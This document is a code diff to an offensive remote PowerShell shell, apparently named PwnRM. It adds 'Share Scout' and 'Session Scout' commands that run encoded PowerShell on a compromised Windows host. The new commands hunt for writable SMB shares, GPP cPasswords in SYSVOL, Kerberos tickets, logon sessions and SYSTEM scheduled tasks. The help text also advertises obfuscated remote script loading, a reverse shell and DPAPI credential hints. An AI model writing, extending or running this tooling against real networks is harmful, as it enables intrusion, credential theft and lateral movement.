@@ -22,7 +22,9 @@ except ImportError:
 from ..core.utils import strip_ansi
 from .ui       import R, G, Y, B, M, C, W, DIM, BLD, RST, c, _BANNER, _COMPLETIONS
 from .ctrlc    import CtrlCHandler
-from .adtriage import get_adtriage_ps
+from .adtriage  import get_adtriage_ps
+from .shares    import get_shares_ps
+from .sessions  import get_sessions_ps
 from .commands import (
     chunks, b64str, split_args, xorenc, str_b64,
     _xor_key,
@@ -137,9 +139,13 @@ class PwnShell:
           {c(Y,'!psrun')} [-xor] URL                Load & exec remote PS1 (obfuscated ScriptBlock)
           {c(Y,'!netrun')} [-xor] URL [ARG..]        Load & exec remote .NET assembly
           {c(Y,'!revshell')} IP PORT                 Raw Winsock reverse shell (full I/O)
-          {c(Y,'!adtriage')} [-q]                    {c(M,'[NEW]')} AD post-auth recon:
+          {c(Y,'!adtriage')} [-q]                    AD post-auth recon:
                                                SPNs · AS-REP · delegation · ADCS·
                                                gMSA/dMSA · ACL quick-wins · BadSuccessor
+          {c(Y,'!shares')} [-q] [HOST..]              {c(M,'[NEW]')} SMB share scout:
+                                               UNC access · ACLs · SYSVOL GPP · writable shares
+          {c(Y,'!sessions')} [-q]                    {c(M,'[NEW]')} Session & network snapshot:
+                                               logon sessions · Kerberos tickets · TCP conns · pipes
           {c(Y,'!sysinfo')}                          Quick OS / AV / hotfix snapshot
           {c(Y,'!creds')}                            DPAPI / PowerShell history / credential hint
           {c(Y,'!log')} / {c(Y,'!stoplog')}                  Toggle session transcript
@@ -171,6 +177,8 @@ class PwnShell:
                 ("!psrun ",     self.psrun),
                 ("!revshell ",  self.revshell),
                 ("!adtriage",   self._adtriage_dispatch),
+                ("!shares",     self._shares_dispatch),
+                ("!sessions",   self._sessions_dispatch),
                 ("!sysinfo",    lambda _: self.sysinfo()),
                 ("!creds",      lambda _: self.creds_hint()),
                 ("!log",        lambda _: self.start_log()),
@@ -304,6 +312,59 @@ class PwnShell:
         encoded = b64str(ps.encode("utf-16le"))
         cmd = f"powershell -NonInteractive -EncodedCommand {encoded}"
         # Prefer direct Invoke-Expression so the output streams correctly
+        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
+        self.run_with_interrupt(cmd, self.write_line)
+
+    # ── !shares (NEW in v1.2.0) ──────────────────────────────────────────────
+    def _shares_dispatch(self, args: str):
+        parts = args.split()
+        quick = False
+        targets: list[str] = []
+        for p in parts:
+            if p.lower() in ("-q", "--quick"):
+                quick = True
+            else:
+                targets.append(p)
+        self.shares(quick=quick, targets=targets)
+
+    def shares(self, quick: bool = False, targets: list[str] | None = None):
+        """
+        Share Scout — SMB share enumeration + permission mapping executed
+        entirely inside the remote PowerShell session.
+        Covers: local shares, UNC access tests (read/write), ACL quick-wins,
+        SYSVOL/NETLOGON sensitive file scan (GPP cPassword detection),
+        open files, and active SMB sessions.
+
+        Usage: !shares [-q] [HOST1 HOST2 ...]
+          -q / --quick  Identity + local shares + quick UNC probe only
+          HOST ..       Explicit targets (default: localhost + AD discovery)
+        """
+        self.write_info(c(M+BLD, "  [*] PwnRM Share Scout — loading remote enumeration module..."))
+        ps = get_shares_ps(quick=quick, targets=targets or [])
+        encoded = b64str(ps.encode("utf-16le"))
+        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
+        self.run_with_interrupt(cmd, self.write_line)
+
+    # ── !sessions (NEW in v1.2.0) ────────────────────────────────────────────
+    def _sessions_dispatch(self, args: str):
+        quick = "-q" in args.lower() or "--quick" in args.lower()
+        self.sessions(quick=quick)
+
+    def sessions(self, quick: bool = False):
+        """
+        Session Scout — active logon session + network connection snapshot
+        executed entirely inside the remote PowerShell session.
+        Covers: interactive/remote logon sessions, RDP client MRU,
+        Kerberos ticket cache (klist), established TCP connections,
+        listening ports with service identification, named pipe exposure,
+        and SYSTEM-level scheduled tasks.
+
+        Usage: !sessions [-q]
+          -q / --quick  Logon sessions + RDP MRU only (no network/pipe scan)
+        """
+        self.write_info(c(M+BLD, "  [*] PwnRM Session Scout — loading remote enumeration module..."))
+        ps = get_sessions_ps(quick=quick)
+        encoded = b64str(ps.encode("utf-16le"))
         cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
         self.run_with_interrupt(cmd, self.write_line)
 
